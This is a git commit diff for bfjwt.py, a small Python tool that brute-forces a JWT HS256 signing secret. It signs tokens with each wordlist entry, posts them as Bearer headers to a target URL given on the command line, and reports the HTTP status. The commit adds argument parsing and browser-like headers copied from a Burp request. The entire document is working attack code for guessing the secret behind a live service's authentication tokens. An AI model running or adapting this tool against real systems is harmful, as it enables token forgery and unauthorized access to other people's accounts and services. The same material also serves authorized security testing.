39f50bd5f565e2e88b9917d982b1dd7adc311e33
g0ttfr1d <yurimaia@protonmail.ch>
2019-06-19 16:27:59 -0300

    Update

--- bfjwt.py
+++ bfjwt.py
@@ -1,18 +1,30 @@
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
 import requests
 import jwt
+import argparse
 
-wl = open('wordlist.txt')
+parser = argparse.ArgumentParser()
+parser.add_argument('-u', '--url', type=str, required=True)
+parser.add_argument('-r', '--referer', type=str, required=True)
+parser.add_argument('-w', '--wordlist', type=str, required=True)
+args = parser.parse_args()
+
+wl = open(args.wordlist)
 wl = wl.read().split('\n')
-     
+user_agents = open('user_agents.txt')
+user_agents = user_agents.read().split('\n')
+
 for secret in wl:
 
     encoded = jwt.encode({"bla" : "blabla"}, '{s}'.format(s=secret), algorithm='HS256')
     req = str(encoded)
     tkn = "Bearer {t}".format(t=req[2:-1])
 
-    burp0_url = 'URL'
-    burp0_headers = HEADER
+    burp0_url = args.url
+    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0", "Accept": "application/json", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "", "authorization": ""}
     burp0_headers['authorization'] = tkn
+    burp0_headers['Referer'] = args.referer
 
     r = requests.post(burp0_url, headers=burp0_headers)
     print('{s} > {r}'.format(s=secret,r=r.status_code))
